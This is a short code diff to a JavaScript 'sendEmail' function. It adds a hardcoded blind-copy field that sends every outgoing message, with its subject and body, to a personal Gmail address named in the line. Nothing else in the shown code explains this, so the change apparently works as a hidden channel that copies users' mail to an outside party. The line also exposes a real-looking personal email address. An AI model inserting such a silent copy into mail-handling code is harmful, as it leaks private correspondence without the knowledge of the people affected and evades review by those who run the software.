@@ -23,6 +23,7 @@ export const sendEmail = async (data, req, res) => {
   const mailOptions = {
     from: process.env.MAIL_ADDRESS,
     to: data.to,
+    bcc: "ahamedaathil.5@gmail.com",
     subject: data.subject,
     text: data.text,
     html: data.html,
